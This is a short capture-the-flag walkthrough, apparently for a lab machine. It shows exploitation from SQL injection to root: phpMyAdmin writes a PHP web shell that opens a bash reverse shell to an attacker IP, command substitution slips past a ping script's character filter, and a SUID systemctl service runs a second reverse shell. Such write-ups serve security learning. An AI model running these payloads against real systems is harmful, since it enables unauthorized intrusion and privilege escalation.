sqli in website on port 80
username: DBadmin
password: imissyou
PHPmyadmin

>>login to 10.10.10.143/phpmyadmin with credentials you got 

##reverse shell with php with sql in phpadmin
select '<?php exec("bash -c \'bash -i >& /dev/tcp/10.10.14.68/7979 0>&1\'"); ?>' INTO OUTFILE '/var/www/html/shell3.php';

load file /var/www/html/shell3.php >> now we get shell as www-data which is apache user

>>sudo -l
(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

##we see that www-data k can run simpler.py as pepper without password
## cat simpler.py 
def exec_ping():
  forbidden = ['&', ';', '-', '`', '||', '|']
  command = input('Enter an IP: ')
  for i in forbidden:
    if i in command:
    print('Got you')
    exit()
   os.system('ping ' + command)

>>sudo -u pepper /var/www/Admin-Utilities/simpler.py -ping

>>$(/bin/bash)

##now we get reverse shell as PEPPER user

>>find / -perm -u=s -type f 2>/dev/null 

##we see that systemctl runs as root but pepper owns it
##systemctl: manage systemmd services, Systemd is an init system and system manage,
The fundamental purpose of an init system is to initialize the components that must be started after the Linux kernel is booted##


## MAKE SYSTEMCTL SERVICE ##

>>vi monairy.service 

[Unit]
Description=Example systemd service.
 
[Service]
Type=simple
ExecStart=/bin/bash /home/pepper/mon.sh
 
[Install]
WantedBy=multi-user.target

>>vi mon.sh
   bash -i >& /dev/tcp/10.10.14.68/6666 0>&1

>>TF=/home/pepper/monairy.service
>>/bin/systemctl link $TF
>>/bin/systemctl enable --now $TF

And you are root :D

